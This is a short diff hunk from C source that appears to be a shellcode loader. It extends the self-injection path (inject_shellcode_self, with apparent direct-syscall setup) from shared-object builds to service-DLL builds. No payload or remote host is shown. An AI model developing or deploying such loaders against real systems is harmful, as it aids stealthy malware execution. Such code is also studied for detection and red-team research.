@@ -65,7 +65,7 @@ int _main(int argc, char** argv) {
         my_init_syscalls_list();
     #endif
     HANDLE hThread = (HANDLE)-1;
-    #ifdef SHAREDOBJECT
+    #if defined(SHAREDOBJECT) || defined(SERVICE_DLL)
         NTSTATUS status = inject_shellcode_self(buf, buf_size, &hThread, FALSE, sleep_time);
     #else
         NTSTATUS status = inject_shellcode_self(buf, buf_size, &hThread, TRUE, sleep_time);
